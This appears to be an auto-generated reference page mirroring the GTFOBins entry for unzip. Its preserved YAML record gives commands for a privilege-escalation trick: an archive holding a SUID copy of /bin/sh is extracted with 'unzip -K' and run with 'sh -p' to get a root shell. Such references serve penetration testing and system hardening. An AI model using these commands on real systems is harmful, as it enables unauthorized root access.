---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# unzip

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `unzip` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/unzip` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [unzip](../../tools/linux/unzip.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | unzip |
| name | unzip |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/unzip/ |

## Preserved Source Material

````yaml
_body: ''
_name: unzip
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/unzip
comment: 'Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an archive beforehand with the following
  commands as root:


  ```

  cp /bin/sh .

  chmod +s sh

  zip shell.zip sh

  ```'
functions:
  privilege-escalation:
  - code: 'unzip -K shell.zip

      ./sh -p'
    contexts:
      sudo: null
      suid: null
````
